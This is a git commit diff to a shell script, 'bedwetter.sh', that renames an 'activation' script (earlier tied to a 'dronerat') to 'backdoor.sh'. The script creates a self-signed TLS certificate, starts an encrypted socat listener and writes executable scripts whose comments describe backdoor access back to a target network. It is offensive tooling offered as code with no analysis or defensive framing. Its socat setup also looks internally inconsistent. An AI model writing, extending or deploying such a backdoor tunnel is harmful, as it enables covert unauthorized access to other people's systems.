883797c812c87ed33a060713e6f47a40c82bff44
810810810 <108226535+810810810@users.noreply.github.com>
2023-06-10 11:00:23 -0400

    Update bedwetter.sh

--- bedwetter.sh
+++ bedwetter.sh
@@ -17,23 +17,23 @@ IP_ADDRESS=$(head /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1).$(head /d
 
 SERVER_IP="$IP_ADDRESS"
 OUTPUT_FILE="$SERVER_IP.sh"
-ACTIVATION_FILE="activate_dronerat.sh"
+BACKDOOR_FILE="backdoor.sh"
 CERT_FILE="server.crt"
 KEY_FILE="server.key"
 
 # Generate self-signed SSL/TLS certificate and key files
 openssl req -x509 -newkey rsa:4096 -keyout "$KEY_FILE" -out "$CERT_FILE" -days 365 -subj "/CN=$SERVER_IP" -nodes
 
-# Create a new shell script file with a random filename for activation
+# Create a new shell script file with a random filename for the backdoor
 {
   echo "#!/bin/bash"
   echo ""
   echo "# Connect to the server as a client"
   echo "socat TCP:$SERVER_IP:$PORT openssl-connect:$SERVER_IP:$PORT,verify=0 &"
-} > "$ACTIVATION_FILE"
+} > "$BACKDOOR_FILE"
 
-# Make the activation script file executable
-chmod +x "$ACTIVATION_FILE"
+# Make the backdoor script file executable
+chmod +x "$BACKDOOR_FILE"
 
 # Start the server with encryption and tunneling using socat
 socat OPENSSL-LISTEN:$PORT,cert="$CERT_FILE",key="$KEY_FILE",fork TCP:$SERVER_IP:$PORT,verify=0 &
@@ -41,16 +41,16 @@ socat OPENSSL-LISTEN:$PORT,cert="$CERT_FILE",key="$KEY_FILE",fork TCP:$SERVER_IP
 # Sleep for a moment to allow the server to start
 sleep 1
 
-# Create a new shell script file with a random filename for access back to the target network
+# Create a new shell script file with a random filename for access to the backdoor
 {
   echo "#!/bin/bash"
   echo ""
-  echo "# Start the activation script"
-  echo "./$ACTIVATION_FILE"
+  echo "# Start the backdoor script"
+  echo "./$BACKDOOR_FILE"
 } > "$OUTPUT_FILE"
 
 # Make the access script file executable
 chmod +x "$OUTPUT_FILE"
 
-echo "Activation script created: $ACTIVATION_FILE"
+echo "Backdoor script created: $BACKDOOR_FILE"
 echo "Access script created: $OUTPUT_FILE"
